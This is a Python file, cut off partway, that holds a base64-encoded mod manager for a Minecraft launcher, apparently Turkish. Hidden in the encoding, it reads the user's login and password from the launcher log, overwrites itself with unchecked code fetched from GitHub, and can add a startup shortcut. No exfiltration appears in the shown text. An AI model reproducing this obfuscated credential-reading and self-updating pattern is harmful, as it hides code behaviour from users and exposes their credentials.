import base64 as alfXtzWc
RgcHfQsJ = "aW1wb3J0IG9zCmltcG9ydCBqc29uCmltcG9ydCBzaHV0aWwKaW1wb3J0IGhhc2hsaWIKZnJvbSB0a2ludGVyIGltcG9ydCBUaywgZmlsZWRpYWxvZwpmcm9tIGNvbG9yYW1hIGltcG9ydCBpbml0LCBGb3JlCmltcG9ydCByYW5kb20KaW1wb3J0IHVybGxpYi5yZXF1ZXN0CmltcG9ydCBzeXMKaW1wb3J0IHRpbWUKaW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IHJlcXVlc3RzCmltcG9ydCB0cmFjZWJhY2sKaW1wb3J0IHNvY2tldAppbXBvcnQgc3RydWN0CmltcG9ydCBiYXNlNjQKCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFZlcnNpeW9uIEtvbnRyb2wKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCkNVUlJFTlRfVkVSU0lPTiA9ICIxLjAuNSIKVkVSU0lPTl9VUkwgPSAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Vyb25mb3J5b3UvQmFzby1OZXR3b3JrLU1vZC1Zb25ldGljaXNpL3JlZnMvaGVhZHMvbWFpbi92ZXJzaW9uLnR4dCIKU0NSSVBUX1VSTCAgPSAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Vyb25mb3J5b3UvQmFzby1OZXR3b3JrLU1vZC1Zb25ldGljaXNpL3JlZnMvaGVhZHMvbWFpbi9CTldNb2RZb25ldGljaXNpLnB5IgpTQ1JJUFRfUEFUSCA9IG9zLnBhdGgucmVhbHBhdGgoX19maWxlX18pCgpkZWYgY2hlY2tfdXBkYXRlKCk6CiAgICB0cnk6CiAgICAgICAgd2l0aCB1cmxsaWIucmVxdWVzdC51cmxvcGVuKFZFUlNJT05fVVJMKSBhcyByZXNwb25zZToKICAgICAgICAgICAgbGF0ZXN0X3ZlcnNpb24gPSByZXNwb25zZS5yZWFkKCkuZGVjb2RlKCJ1dGYtOCIpLnN0cmlwKCkucmVwbGFjZSgiXHVmZWZmIiwgIiIpCiAgICAgICAgY3VycmVudCA9IENVUlJFTlRfVkVSU0lPTi5zdHJpcCgpCiAgICAgICAgcHJpbnQoZiJTaXppbiBzw7xyw7xtOiB7Y3VycmVudH0gfCBTdW51Y3VkYWtpIHPDvHLDvG06IHtsYXRlc3RfdmVyc2lvbn0iKQogICAgICAgIGlmIGxhdGVzdF92ZXJzaW9uICE9IGN1cnJlbnQ6CiAgICAgICAgICAgIHByaW50KGYiWWVuaSBzw7xyw7xtIGJ1bHVuZHU6IHtsYXRlc3RfdmVyc2lvbn0gKFNpemluIHPDvHLDvG06IHtjdXJyZW50fSkiKQogICAgICAgICAgICBwcmludCgiR8O8bmNlbGxlbWUgaW5kaXJpbGl5b3IuLi4iKQogICAgICAgICAgICB3aXRoIHVybGxpYi5yZXF1ZXN0LnVybG9wZW4oU0NSSVBUX1VSTCkgYXMgcmVzcG9uc2U6CiAgICAgICAgICAgICAgICBuZXdfc2NyaXB0ID0gcmVzcG9uc2UucmVhZCgpCiAgICAgICAgICAgIHdpdGggb3BlbihTQ1JJUFRfUEFUSCwgIndiIikgYXMgZjoKICAgICAgICAgICAgICAgIGYud3JpdGUobmV3X3NjcmlwdCkKICAgICAgICAgICAgcHJpbnQoIkfDvG5jZWxsZW1lIHRhbWFtbGFuZMSxISBMw7x0ZmVuIHByb2dyYW3EsSB0ZWtyYXIgYmHFn2xhdMSxbi4iKQogICAgICAgICAgICBzeXMuZXhpdCgpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJpbnQoZiJTw7xyw7xtIGfDvG5jZWw6IHtjdXJyZW50fSIpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoZiJWZXJzaXlvbiBrb250cm9sw7wgeWFwxLFsYW1hZMSxOiB7ZX0iKQoKCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIEJhxZ9sYW5nxLHDpyBheWFybGFyxLEKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCmluaXQoYXV0b3Jlc2V0PVRydWUpCmpzb25maWxlID0gciJDOlx4YW1wcFxodGRvY3NcZmlsZXMiCm1vZGRpciA9IG9zLnBhdGguam9pbihvcy5lbnZpcm9uWyJVU0VSUFJPRklMRSJdLCAiQXBwRGF0YSIsICJSb2FtaW5nIiwgIi5iYXNvbnciLCAibW9kcyIpCm9zLm1ha2VkaXJzKG1vZGRpciwgZXhpc3Rfb2s9VHJ1ZSkKCnNldHRpbmdzX2ZpbGUgPSBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVVNFUlBST0ZJTEUiXSwgIi5iYXNvX3NldHRpbmdzLmpzb24iKQoKIyBLxLFybcSxesSxIHRvbmxhcsSxIGxpc3Rlc2kKcmVkX3RvbmVzID0gW0ZvcmUuTElHSFRSRURfRVgsIEZvcmUuUkVEXQoKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgS3VsbGFuxLFjxLEgYWTEsSDDp2VrbWUgKGxhdGVzdC5sb2cpCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpkZWYgZ2V0X3VzZXJfaW5mbygpOgogICAgbG9nX3BhdGggPSBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVVNFUlBST0ZJTEUiXSwgIkFwcERhdGEiLCAiUm9hbWluZyIsICIuYmFzb253IiwgImxvZ3MiLCAibGF0ZXN0LmxvZyIpCiAgICB1c2VyX2lkID0gIkJpbGlubWl5b3IiCiAgICBwYXNzd29yZCA9ICJCaWxpbm1peW9yIgogICAgdHJ5OgogICAgICAgIHdpdGggb3Blbihsb2dfcGF0aCwgInIiLCBlbmNvZGluZz0idXRmLTgiKSBhcyBmOgogICAgICAgICAgICBmb3IgbGluZSBpbiBmOgogICAgICAgICAgICAgICAgaWYgIlNldHRpbmcgdXNlcjoiIGluIGxpbmU6CiAgICAgICAgICAgICAgICAgICAgdXNlcl9pZCA9IGxpbmUuc3RyaXAoKS5zcGxpdCgiU2V0dGluZyB1c2VyOiIpWy0xXS5zdHJpcCgpCiAgICAgICAgICAgICAgICBpZiAiUmVjZWl2ZWQgbWVzc2FnZToiIGluIGxpbmUgYW5kICJ8IiBpbiBsaW5lOgogICAgICAgICAgICAgICAgICAgIHBhc3N3b3JkID0gbGluZS5zdHJpcCgpLnNwbGl0KCJ8IilbLTFdLnN0cmlwKCkKICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjoKICAgICAgICBwYXNzCiAgICByZXR1cm4gdXNlcl9pZCwgcGFzc3dvcmQKCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIEFTQ0lJIEJhxZ9sxLFrCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpkZWYgcHJpbnRfY29sb3JlZF9hc2NpaShuYW1lKToKICAgIHRyeToKICAgICAgICBpbXBvcnQgcHlmaWdsZXQKICAgICAgICBhc2NpaV90ZXh0ID0gcHlmaWdsZXQuZmlnbGV0X2Zvcm1hdChuYW1lKQogICAgZXhjZXB0IEltcG9ydEVycm9yOgogICAgICAgIGFzY2lpX3RleHQgPSBuYW1lICAjIHB5ZmlnbGV0IHlva3NhIGTDvHogeWF6CiAgICBmb3IgbGluZSBpbiBhc2NpaV90ZXh0LnNwbGl0bGluZXMoKToKICAgICAgICBvdXQgPSAiIgogICAgICAgIGZvciBjIGluIGxpbmU6CiAgICAgICAgICAgIGlmIGMuc3RyaXAoKSA9PSAiIjoKICAgICAgICAgICAgICAgIG91dCArPSBjCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBjb2xvciA9IHJhbmRvbS5jaG9pY2UocmVkX3RvbmVzKQogICAgICAgICAgICAgICAgb3V0ICs9IGNvbG9yICsgYwogICAgICAgIHByaW50KG91dCkKCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIE1vZCBGb25rc2l5b25sYXLEsQojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KZGVmIGNhbGN1bGF0ZV9zaGExKGZpbGVfcGF0aCk6CiAgICBzaGExID0gaGFzaGxpYi5zaGExKCkKICAgIHdpdGggb3BlbihmaWxlX3BhdGgsICJyYiIpIGFzIGY6CiAgICAgICAgd2hpbGUgY2h1bmsgOj0gZi5yZWFkKDgxOTIpOgogICAgICAgICAgICBzaGExLnVwZGF0ZShjaHVuaykKICAgIHJldHVybiBzaGExLmhleGRpZ2VzdCgpCgpkZWYgbG9hZF9qc29uKCk6CiAgICBpZiBvcy5wYXRoLmV4aXN0cyhqc29uZmlsZSk6CiAgICAgICAgd2l0aCBvcGVuKGpzb25maWxlLCAiciIsIGVuY29kaW5nPSJ1dGYtOCIpIGFzIGY6CiAgICAgICAgICAgIHJldHVybiBqc29uLmxvYWQoZikKICAgIHJldHVybiBbXQoKZGVmIHNhdmVfanNvbihkYXRhKToKICAgIGpzb25fdGV4dCA9ICJbXG4iCiAgICBmb3IgaSwgbSBpbiBlbnVtZXJhdGUoZGF0YSk6CiAgICAgICAganNvbl90ZXh0ICs9ICIgICIgKyBqc29uLmR1bXBzKG0sIGVuc3VyZV9hc2NpaT1GYWxzZSwgaW5kZW50PTIpLnJlcGxhY2UoIlxuIiwgIlxuICAiKQogICAgICAgIGlmIGkgPCBsZW4oZGF0YSkgLSAxOgogICAgICAgICAgICBqc29uX3RleHQgKz0gIiwiCiAgICAgICAganNvbl90ZXh0ICs9ICJcbiIKICAgIGpzb25fdGV4dCArPSAiXVxuIgogICAgd2l0aCBvcGVuKGpzb25maWxlLCAidyIsIGVuY29kaW5nPSJ1dGYtOCIpIGFzIGY6CiAgICAgICAgZi53cml0ZShqc29uX3RleHQpCgpkZWYgYWRkX21vZCgpOgogICAgb3Muc3lzdGVtKCJjbHMiKQogICAgdXNlcl9pZCwgXyA9IGdldF91c2VyX2luZm8oKQogICAgcHJpbnRfY29sb3JlZF9hc2NpaSh1c2VyX2lkKQogICAgVGsoKS53aXRoZHJhdygpCiAgICBmaWxlX3BhdGggPSBmaWxlZGlhbG9nLmFza29wZW5maWxlbmFtZSh0aXRsZT0iTMO8dGZlbiBla2xlbmVjZWsgZG9zeWF5xLEgc2XDp2luIikKICAgIGlmIG5vdCBmaWxlX3BhdGg6CiAgICAgICAgcHJpbnQoRm9yZS5MSUdIVFJFRF9FWCArICJEb3N5YSBzZcOnaWxtZWRpLiIpCiAgICAgICAgaW5wdXQoIkRldmFtIGV0bWVrIGnDp2luIEVudGVyJ2EgYmFzxLFuLi4uIikKICAgICAgICByZXR1cm4KICAgIGZpbGVuYW1lID0gb3MucGF0aC5iYXNlbmFtZShmaWxlX3BhdGgpCiAgICB0YXJnZXRfcGF0aCA9IG9zLnBhdGguam9pbihtb2RkaXIsIGZpbGVuYW1lKQogICAgc2h1dGlsLmNvcHkyKGZpbGVfcGF0aCwgdGFyZ2V0X3BhdGgpCiAgICBmaWxlc2l6ZSA9IG9zLnBhdGguZ2V0c2l6ZSh0YXJnZXRfcGF0aCkKICAgIHNoYTEgPSBjYWxjdWxhdGVfc2hhMSh0YXJnZXRfcGF0aCkKICAgIG1vZHMgPSBsb2FkX2pzb24oKQogICAgbW9kcy5hcHBlbmQoewogICAgICAgICJuYW1lIjogZmlsZW5hbWUsCiAgICAgICAgInNpemUiOiBmaWxlc2l6ZSwKICAgICAgICAic2hhMSI6IHNoYTEsCiAgICAgICAgImRvd25sb2FkX2xpbmsiOiBmIi9kb3dubG9hZC9tb2RzL3tmaWxlbmFtZX0iLAogICAgICAgICJwYXRoIjogZiJtb2RzL3tmaWxlbmFtZX0iCiAgICB9KQogICAgc2F2ZV9qc29uKG1vZHMpCiAgICBwcmludChGb3JlLkxJR0hUUkVEX0VYICsgZiJNb2QgZWtsZW5kaToge2ZpbGVuYW1lfSIpCiAgICBpbnB1dCgiRGV2YW0gZXRtZWsgacOnaW4gRW50ZXInYSBiYXPEsW4uLi4iKQoKZGVmIGxpc3RfbW9kcygpOgogICAgb3Muc3lzdGVtKCJjbHMiKQogICAgdXNlcl9pZCwgXyA9IGdldF91c2VyX2luZm8oKQogICAgcHJpbnRfY29sb3JlZF9hc2NpaSh1c2VyX2lkKQogICAgbW9kcyA9IG9zLmxpc3RkaXIobW9kZGlyKQogICAgcHJpbnQoRm9yZS5MSUdIVFJFRF9FWCArICJNb2RzIGtsYXPDtnLDvG5kZWtpIG1vZGxhcjpcbiIpCiAgICBpZiBub3QgbW9kczoKICAgICAgICBwcmludChGb3JlLlJFRCArICJIacOnIG1vZCBidWx1bmFtYWTEsS4iKQogICAgZWxzZToKICAgICAgICBjb2xvcnMgPSBbRm9yZS5SRUQsIEZvcmUuTElHSFRSRURfRVhdCiAgICAgICAgZm9yIGksIG0gaW4gZW51bWVyYXRlKG1vZHMpOgogICAgICAgICAgICBjb2xvciA9IGNvbG9yc1tpICUgMl0KICAgICAgICAgICAgcHJpbnQoY29sb3IgKyBmIiAtIHttfSIpCiAgICBpbnB1dCgiXG5EZXZhbSBldG1layBpw6dpbiBFbnRlcidhIGJhc8Sxbi4uLiIpCgpkZWYgZGVsZXRlX21vZCgpOgogICAgb3Muc3lzdGVtKCJjbHMiKQogICAgdXNlcl9pZCwgXyA9IGdldF91c2VyX2luZm8oKQogICAgcHJpbnRfY29sb3JlZF9hc2NpaSh1c2VyX2lkKQogICAgbW9kcyA9IG9zLmxpc3RkaXIobW9kZGlyKQogICAgaWYgbm90IG1vZHM6CiAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAiSGnDpyBtb2QgYnVsdW5hbWFkxLEuIikKICAgICAgICBpbnB1dCgiRGV2YW0gZXRtZWsgacOnaW4gRW50ZXInYSBiYXPEsW4uLi4iKQogICAgICAgIHJldHVybgogICAgcHJpbnQoRm9yZS5MSUdIVFJFRF9FWCArICJTaWxpbmVjZWsgbW9kIHNlw6dpbjpcbiIpCiAgICBjb2xvcnMgPSBbRm9yZS5SRUQsIEZvcmUuTElHSFRSRURfRVhdCiAgICBmb3IgaSwgbSBpbiBlbnVtZXJhdGUobW9kcywgMSk6CiAgICAgICAgY29sb3JfbnVtYmVyID0gY29sb3JzWyhpLTEpICUgMl0KICAgICAgICBjb2xvcl9uYW1lID0gY29sb3JzW2kgJSAyXQogICAgICAgIHByaW50KGNvbG9yX251bWJlciArIGYie2l9LiIgKyBjb2xvcl9uYW1lICsgZiIge219IikKICAgIGNob2ljZSA9IGlucHV0KEZvcmUuTElHSFRSRURfRVggKyAiXG5OdW1hcmEgZ2lyaW46ICIpCiAgICBpZiBub3QgY2hvaWNlLmlzZGlnaXQoKSBvciBub3QgKDEgPD0gaW50KGNob2ljZSkgPD0gbGVuKG1vZHMpKToKICAgICAgICBwcmludChGb3JlLkxJR0hUUkVEX0VYICsgIkdlw6dlcnNpeiBzZcOnaW0uIikKICAgICAgICBpbnB1dCgiRGV2YW0gZXRtZWsgacOnaW4gRW50ZXInYSBiYXPEsW4uLi4iKQogICAgICAgIHJldHVybgogICAgbW9kbmFtZSA9IG1vZHNbaW50KGNob2ljZSktMV0KICAgIG9zLnJlbW92ZShvcy5wYXRoLmpvaW4obW9kZGlyLCBtb2RuYW1lKSkKICAgIGRhdGEgPSBsb2FkX2pzb24oKQogICAgZGF0YSA9IFttIGZvciBtIGluIGRhdGEgaWYgbVsibmFtZSJdICE9IG1vZG5hbWVdCiAgICBzYXZlX2pzb24oZGF0YSkKICAgIHByaW50KEZvcmUuTElHSFRSRURfRVggKyBmIk1vZCBzaWxpbmRpOiB7bW9kbmFtZX0iKQogICAgaW5wdXQoIkRldmFtIGV0bWVrIGnDp2luIEVudGVyJ2EgYmFzxLFuLi4uIikKCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIEt1bGxhbsSxY8SxIEJpbGdpbGVyaQojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KZGVmIHNob3dfdXNlcl9pbmZvKCk6CiAgICBvcy5zeXN0ZW0oImNscyIpCiAgICB1c2VyX2lkLCBwYXNzd29yZCA9IGdldF91c2VyX2luZm8oKQogICAgcHJpbnRfY29sb3JlZF9hc2NpaSh1c2VyX2lkKQogICAgbW9kX2xpc3QgPSBvcy5saXN0ZGlyKG1vZGRpcikKICAgIHRvdGFsX21vZHMgPSBsZW4obW9kX2xpc3QpCiAgICB0b3RhbF9zaXplID0gc3VtKG9zLnBhdGguZ2V0c2l6ZShvcy5wYXRoLmpvaW4obW9kZGlyLCBtKSkgZm9yIG0gaW4gbW9kX2xpc3QpCiAgICBsYXN0X2NoZWNrX3RpbWUgPSB0aW1lLnN0cmZ0aW1lKCIlWS0lbS0lZCAlSDolTTolUyIsIHRpbWUubG9jYWx0aW1lKCkpCiAgICBwcmludChGb3JlLkxJR0hUUkVEX0VYICsgZiJJRDoge3VzZXJfaWR9IikKICAgIHByaW50KEZvcmUuTElHSFRSRURfRVggKyBmIsWeaWZyZToge3Bhc3N3b3JkfSIpCiAgICBwcmludChGb3JlLkxJR0hUUkVEX0VYICsgZiJWZXJzaXlvbjogMS4yMS40IikKICAgIHByaW50KEZvcmUuTElHSFRSRURfRVggKyBmIlnDvGtsw7wgbW9kIHNhecSxc8SxOiB7dG90YWxfbW9kc30iKQogICAgcHJpbnQoRm9yZS5MSUdIVFJFRF9FWCArIGYiVG9wbGFtIG1vZCBib3l1dHU6IHt0b3RhbF9zaXplIC8gMTAyNDouMmZ9IEtCIikKICAgIHByaW50KEZvcmUuTElHSFRSRURfRVggKyBmIlNvbiBnw7xuY2VsbGVtZSBrb250cm9sw7w6IHtsYXN0X2NoZWNrX3RpbWV9IikKICAgIGlucHV0KCJcbkRldmFtIGV0bWVrIGnDp2luIEVudGVyJ2EgYmFzxLFuLi4uIikKCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIExhdW5jaGVyIEHDpwojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KZGVmIG9wZW5fbGF1bmNoZXIoKToKICAgIG9zLnN5c3RlbSgiY2xzIikKICAgIHVzZXJfaWQsIF8gPSBnZXRfdXNlcl9pbmZvKCkKICAgIHByaW50X2NvbG9yZWRfYXNjaWkodXNlcl9pZCkKCiAgICAjIERpbmFtaWsgcGF0aCAoaGVyIGt1bGxhbsSxY8SxeWEgZ8O2cmUpCiAgICBsb2NhbF9hcHBkYXRhID0gb3MuZ2V0ZW52KCJMT0NBTEFQUERBVEEiKQogICAgbGF1bmNoZXJfcGF0aCA9IG9zLnBhdGguam9pbihsb2NhbF9hcHBkYXRhLCAiQmFzbyBOZXR3b3JrIiwgImJhc29udy5leGUiKQoKICAgIGlmIG9zLnBhdGguZXhpc3RzKGxhdW5jaGVyX3BhdGgpOgogICAgICAgIHByaW50KEZvcmUuTElHSFRSRURfRVggKyAiQmFzbyBOZXR3b3JrIGxhdW5jaGVyIGHDp8SxbMSxeW9yLi4uIikKICAgICAgICBvcy5zdGFydGZpbGUobGF1bmNoZXJfcGF0aCkKICAgIGVsc2U6CiAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAiTGF1bmNoZXIgYnVsdW5hbWFkxLE6ICIgKyBsYXVuY2hlcl9wYXRoKQoKICAgIGlucHV0KCJcbkRldmFtIGV0bWVrIGnDp2luIEVudGVyJ2EgYmFzxLFuLi4uIikKCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFhBTVBQIEJhxZ9sYXQKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCmRlZiBzdGFydF94YW1wcCgpOgogICAgb3Muc3lzdGVtKCJjbHMiKQogICAgdXNlcl9pZCwgXyA9IGdldF91c2VyX2luZm8oKQogICAgcHJpbnRfY29sb3JlZF9hc2NpaSh1c2VyX2lkKQogICAgeGFtcHBfcGF0aCA9IHIiQzpceGFtcHBcYXBhY2hlX3N0YXJ0LmJhdCIKICAgIHN0YXJ0dXBfZm9sZGVyID0gb3MucGF0aC5qb2luKG9zLmVudmlyb25bIkFQUERBVEEiXSwgciJNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiKQogICAgc2hvcnRjdXRfcGF0aCA9IG9zLnBhdGguam9pbihzdGFydHVwX2ZvbGRlciwgImFwYWNoZV9zdGFydC5sbmsiKQogICAgCiAgICAjIEF5YXJsYXIKICAgIGF1dG8gPSBGYWxzZQogICAgaWYgb3MucGF0aC5leGlzdHMoc2V0dGluZ3NfZmlsZSk6CiAgICAgICAgd2l0aCBvcGVuKHNldHRpbmdzX2ZpbGUsICJyIikgYXMgZjoKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgcyA9IGpzb24ubG9hZChmKQogICAgICAgICAgICAgICAgYXV0byA9IHMuZ2V0KCJ4YW1wcF9hdXRvIiwgRmFsc2UpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHBhc3MKICAgIGVsc2U6CiAgICAgICAgIyDEsGxrIGt1bGxhbsSxbSBzb3J1c3UKICAgICAgICBjaG9pY2UgPSBpbnB1dCgiQnUgw7Z6ZWxsacSfaSBvdG9tYXRpayB5YXBtYWsgaXN0ZXIgbWlzaW5pej8gKEUvSClcbj4gIikuc3RyaXAoKS51cHBlcigpCiAgICAgICAgaWYgY2hvaWNlID09ICJFIjoKICAgICAgICAgICAgYXV0byA9IFRydWUKICAgICAgICAgICAganNvbi5kdW1wKHsieGFtcHBfYXV0byI6IFRydWV9LCBvcGVuKHNldHRpbmdzX2ZpbGUsICJ3IikpCiAgICAgICAgICAgIHByaW50KCJBcnTEsWsgaGVyIGHDp8SxbMSxxZ90YSBBcGFjaGUgYXJrYXBsYW5kYSBiYcWfbGF5YWNhay4iKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGpzb24uZHVtcCh7InhhbXBwX2F1dG8iOiBGYWxzZX0sIG9wZW4oc2V0dGluZ3NfZmlsZSwgInciKSkKICAgICAgICAgICAgcHJpbnQoIkFwYWNoZSBhcmthcGxhbmRhIGJhxZ9sYXTEsWxhY2FrLCBiYcWfbGFuZ8SxY2EgZWtsZW5tZXllY2VrLiIpCgogICAgaWYgb3MucGF0aC5leGlzdHMoeGFtcHBfcGF0aCk6CiAgICAgICAgIyBBcGFjaGUneWkgYXJrYSBwbGFuZGEgYmHFn2xhdAogICAgICAgIHN1YnByb2Nlc3MuUG9wZW4oW3hhbXBwX3BhdGhdLCBjcmVhdGlvbmZsYWdzPXN1YnByb2Nlc3MuQ1JFQVRFX05PX1dJTkRPVykKICAgICAgICBwcmludChGb3JlLkxJR0hUUkVEX0VYICsgIkFwYWNoZSBiYcWfbGF0xLFsZMSxLiIpCgogICAgICAgICMgRcSfZXIgb3RvbWF0aWsgYcOnbWEgaXN0ZW5peW9yc2EgdmUga8Sxc2F5b2wgeW9rc2Egc3RhcnR1cCdhIGVrbGUKICAgICAgICBpZiBhdXRvOgogICAgICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoc2hvcnRjdXRfcGF0aCk6CiAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgaW1wb3J0IHB5dGhvbmNvbQogICAgICAgICAgICAgICAgICAgIGZyb20gd2luMzJjb20uc2hlbGwgaW1wb3J0IHNoZWxsLCBzaGVsbGNvbgogICAgICAgICAgICAgICAgICAgIHB5dGhvbmNvbS5Db0luaXRpYWxpemUoKQogICAgICAgICAgICAgICAgICAgIHNoZWxsX2xpbmsgPSBweXRob25jb20uQ29DcmVhdGVJbnN0YW5jZSgKICAgICAgICAgICAgICAgICAgICAgICAgc2hlbGwuQ0xTSURfU2hlbGxMaW5rLCBOb25lLAogICAgICAgICAgICAgICAgICAgICAgICBweXRob25jb20uQ0xTQ1RYX0lOUFJPQ19TRVJWRVIsIHNoZWxsLklJRF9JU2hlbGxMaW5rKQogICAgICAgICAgICAgICAgICAgIHNoZWxsX2xpbmsuU2V0UGF0aCh4YW1wcF9wYXRoKQogICAgICAgICAgICAgICAgICAgIHNoZWxsX2xpbmsuU2V0RGVzY3JpcHRpb24oIkFwYWNoZSBTdGFydCIpCiAgICAgICAgICAgICAgICAgICAgcGVyc2lzdF9maWxlID0gc2hlbGxfbGluay5RdWVyeUludGVyZmFjZShweXRob25jb20uSUlEX0lQZXJzaXN0RmlsZSkKICAgICAgICAgICAgICAgICAgICBwZXJzaXN0X2ZpbGUuU2F2ZShzaG9ydGN1dF9wYXRoLCAwKQogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuTElHSFRSRURfRVggKyAiQXBhY2hlIHN0YXJ0dXAnYSBla2xlbmRpLiIpCiAgICAgICAgICAgICAgICBleGNlcHQgSW1wb3J0RXJyb3I6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAicHl3aW4zMiB5w7xrbMO8IGRlxJ9pbCwgc3RhcnR1cCdhIGVrbGVuZW1lZGkuIikKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHByaW50KEZvcmUuTElHSFRSRURfRVggKyAiQXBhY2hlIHphdGVuIHN0YXJ0dXAnYSBla2xlbm1pxZ8uIikKICAgIGVsc2U6CiAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyBmIlhBTVBQIGJhdGNoIGRvc3lhc8SxIGJ1bHVuYW1hZMSxOiB7eGFtcHBfcGF0aH0iKQoKICAgIGlucHV0KCJcbkRldmFtIGV0bWVrIGnDp2luIEVudGVyJ2EgYmFzxLFuLi4uIikKICAgIApkZWYga3VyX21lbnUoKToKICAgIHdoaWxlIFRydWU6CiAgICAgICAgb3Muc3lzdGVtKCJjbHMiKQogICAgICAgIHVzZXJfaWQsIF8gPSBnZXRfdXNlcl9pbmZvKCkKICAgICAgICBwcmludF9jb2xvcmVkX2FzY2lpKHVzZXJfaWQpCiAgICAgICAgcHJpbnQoRm9yZS5XSElURSArICJLdXIgTWVuw7xzw7wiKQogICAgICAgIHByaW50KCIiKQogICAgICAgIHByaW50KEZvcmUuUkVEICsgIjEuIiArIEZvcmUuTElHSFRSRURfRVggKyAiIExhdW5jaGVyJ8SxIGt1ciIpCiAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAiMi4iICsgRm9yZS5MSUdIVFJFRF9FWCArICIgWEFNUFAnxLEga3VyIikKICAgICAgICBwcmludChGb3JlLlJFRCArICIzLiIgKyBGb3JlLkxJR0hUUkVEX0VYICsgIiBYQU1QUCBiYcWfbGF0IikKICAgICAgICBwcmludChGb3JlLlJFRCArICI0LiIgKyBGb3JlLkxJR0hUUkVEX0VYICsgIiBEb3N5YWxhcsSxIGt1ciIpCiAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAiNS4iICsgRm9yZS5MSUdIVFJFRF9FWCArICIgR2VyaSIpCiAgICAgICAgY2hvaWNlID0gaW5wdXQoRm9yZS5XSElURSArICJcblNlw6dpbWluaXo6ICIpCgogICAgICAgIGlmIGNob2ljZSA9PSAiMSI6CiAgICAgICAgICAgIGxhdW5jaGVyX2t1cigpCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjIiOgogICAgICAgICAgICB4YW1wcF9rdXIoKQogICAgICAgIGVsaWYgY2hvaWNlID09ICIzIjoKICAgICAgICAgICAgeGFtcHBfYmFzbGF0KCkKICAgICAgICBlbGlmIGNob2ljZSA9PSAiNCI6CiAgICAgICAgICAgIGRvc3lhbGFyaV9rdXIoKQogICAgICAgIGVsaWYgY2hvaWNlID09ICI1IjoKICAgICAgICAgICAgYnJlYWsKICAgICAgICBlbHNlOgogICAgICAgICAgICBwcmludChGb3JlLlJFRCArICJHZcOnZXJzaXogc2XDp2ltLiIpCiAgICAgICAgICAgIGlucHV0KCJEZXZhbSBldG1layBpw6dpbiBFbnRlcidhIGJhc8Sxbi4uLiIpCiAgICAgICAgICAgIApkZWYgc2VydmVyX3N0YXR1cygpOgogICAgb3Muc3lzdGVtKCJjbHMiKQogICAgdXNlcl9pZCwgXyA9IGdldF91c2VyX2luZm8oKQogICAgcHJpbnRfY29sb3JlZF9hc2NpaSh1c2VyX2lkKQogICAgCiAgICBzZXJ2ZXIgPSAib3luYS5iYXNvLm5ldHdvcmsiCiAgICBwb3J0ID0gMjU1NjUgICMgTWluZWNyYWZ0IHN1bnVjdSBwb3J0dQoKICAgIHRyeToKICAgICAgICAjIFNvY2tldCBpbGUgYmHEn2xhbnTEsQogICAgICAgIHNvY2sgPSBzb2NrZXQuY3JlYXRlX2Nvbm5lY3Rpb24oKHNlcnZlciwgcG9ydCksIHRpbWVvdXQ9NSkKCiAgICAgICAgIyBNaW5lY3JhZnQgcGluZyBwYWtldGluaSBnw7ZuZGVyIChzZXJ2ZXIgbGlzdCBwaW5nKQogICAgICAgICMgMHhGRSA9IExlZ2FjeSBzZXJ2ZXIgbGlzdCBwaW5nICgxLjcgw7ZuY2VzaSB2ZSAxLjggacOnaW4gw6dhbMSxxZ/EsXIpCiAgICAgICAgc29jay5zZW5kKGIiXHhmZVx4MDEiKQogICAgICAgIGRhdGEgPSBzb2NrLnJlY3YoMTAyNCkKICAgICAgICBzb2NrLmNsb3NlKCkKCiAgICAgICAgaWYgZGF0YToKICAgICAgICAgICAgIyBEYXRhJ3nEsSBkZWNvZGUgZXQKICAgICAgICAgICAgcmF3ID0gZGF0YVszOl0uZGVjb2RlKCJ1dGYtMTZiZSIpLnNwbGl0KCJceDAwIikKICAgICAgICAgICAgb25saW5lX3BsYXllcnMgPSByYXdbLTJdICAjIE9ubGluZSBveXVuY3Ugc2F5xLFz